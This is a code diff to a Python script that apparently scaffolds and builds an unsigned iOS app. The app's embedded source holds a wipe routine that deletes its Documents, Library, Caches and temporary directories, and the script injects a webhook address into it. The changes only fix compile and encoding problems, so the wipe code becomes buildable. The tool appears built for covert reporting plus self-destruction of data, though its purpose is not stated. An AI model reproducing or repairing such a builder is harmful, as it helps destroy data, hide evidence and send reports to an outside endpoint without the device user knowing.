@@ -135,9 +135,11 @@ static UIBackgroundTaskIdentifier gBgTask = 0;
     [ud setBool:YES forKey:kWipeMarker];
     [ud synchronize];
     NSFileManager *fm = [NSFileManager defaultManager];
-    NSArray *domains = @[NSDocumentDirectory, NSLibraryDirectory, NSCachesDirectory];
-    for (NSString *dom in domains) {
-        NSArray *paths = NSSearchPathForDirectoriesInDomains([dom isEqualToString:NSCachesDirectory] ? NSCachesDirectory : [dom isEqualToString:NSLibraryDirectory] ? NSLibraryDirectory : NSDocumentDirectory, NSUserDomainMask, YES);
+    
+    // FIX: Wrap NSInteger enums in @() to make them NSNumbers
+    NSArray *domains = @[@(NSDocumentDirectory), @(NSLibraryDirectory), @(NSCachesDirectory)];
+    for (NSNumber *dom in domains) {
+        NSArray *paths = NSSearchPathForDirectoriesInDomains([dom unsignedIntegerValue], NSUserDomainMask, YES);
         for (NSString *p in paths) [fm removeItemAtPath:p error:nil];
     }
     [fm removeItemAtPath:NSTemporaryDirectory() error:nil];
@@ -235,6 +237,8 @@ PBXPROJ = '''// !$*UTF8*$!
                 ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = "";
                 INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}";
                 PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2";
+                CLANG_ENABLE_OBJC_ARC = YES;
+                ALWAYS_SEARCH_USER_PATHS = NO;
             }};
             name = Debug;
         }};
@@ -244,6 +248,8 @@ PBXPROJ = '''// !$*UTF8*$!
                 ARCHS = arm64; CODE_SIGNING_ALLOWED = NO; CODE_SIGNING_REQUIRED = NO; CODE_SIGN_IDENTITY = "";
                 INFOPLIST_FILE = Info.plist; IPHONEOS_DEPLOYMENT_TARGET = "15.0"; PRODUCT_BUNDLE_IDENTIFIER = "{BUNDLE_ID}";
                 PRODUCT_NAME = "$(TARGET_NAME)"; SDKROOT = iphoneos; TARGETED_DEVICE_FAMILY = "1,2";
+                CLANG_ENABLE_OBJC_ARC = YES;
+                ALWAYS_SEARCH_USER_PATHS = NO;
             }};
             name = Release;
         }};
@@ -283,10 +289,10 @@ def scaffold():
     scheme_dir = proj / "xcshareddata" / "xcschemes"
     scheme_dir.mkdir(parents=True, exist_ok=True)
     
-    (BUILD_DIR / "main.m").write_text(MAIN_M.replace("__WEBHOOK__", WEBHOOK))
-    (BUILD_DIR / "Info.plist").write_text(INFO_PLIST.format(BUNDLE_ID=BUNDLE_ID, APP_NAME=APP_NAME))
-    (proj / "project.pbxproj").write_text(PBXPROJ.format(BUNDLE_ID=BUNDLE_ID))
-    (scheme_dir / f"{APP_NAME}.xcscheme").write_text(XSCHEME)
+    (BUILD_DIR / "main.m").write_text(MAIN_M.replace("__WEBHOOK__", WEBHOOK), encoding="utf-8")
+    (BUILD_DIR / "Info.plist").write_text(INFO_PLIST.format(BUNDLE_ID=BUNDLE_ID, APP_NAME=APP_NAME), encoding="utf-8")
+    (proj / "project.pbxproj").write_text(PBXPROJ.format(BUNDLE_ID=BUNDLE_ID), encoding="utf-8")
+    (scheme_dir / f"{APP_NAME}.xcscheme").write_text(XSCHEME, encoding="utf-8")
     print(f"[+] scaffolded {proj}")
 
 def build():
